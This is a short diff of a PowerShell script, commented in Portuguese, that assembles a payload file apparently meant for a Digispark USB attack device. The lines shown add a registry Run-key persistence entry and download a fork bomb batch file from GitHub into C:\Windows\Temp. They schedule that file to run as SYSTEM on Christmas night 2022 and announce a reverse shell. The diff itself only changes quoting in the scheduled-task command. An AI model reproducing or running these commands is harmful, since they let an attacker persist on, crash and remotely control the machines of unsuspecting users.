@@ -25,7 +25,7 @@ Write-Output 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v pers
 # Monta a part do Fork Bomb no arquivo
 Write-Output '# Baixa o fork bomb e define para executar na noite de natal' >> .\payload.txt
 Write-Output 'Invoke-WebRequest https://github.com/tomiodarim/Digispark/blob/main/bomb.bat?raw=true -o C:\Windows\Temp\bomb.bat' >> .\payload.txt
-Write-Output 'schtasks /create /RU "system" /sc once /sd "12/25/2022" /st "22:45" /tr C:\Windows\Temp\bombt.bat /rl highest /tn "bomb"' >> .\payload.txt
+Write-Output 'schtasks /create /RU "system" /sc once /sd 12/25/2022 /st 22:45 /tr C:\Windows\Temp\bombt.bat /rl highest /tn "bomb"' >> .\payload.txt
 
 #Executa a shell reversa
 Write-Output '# Invoca a shell reversa' >> .\payload.txt
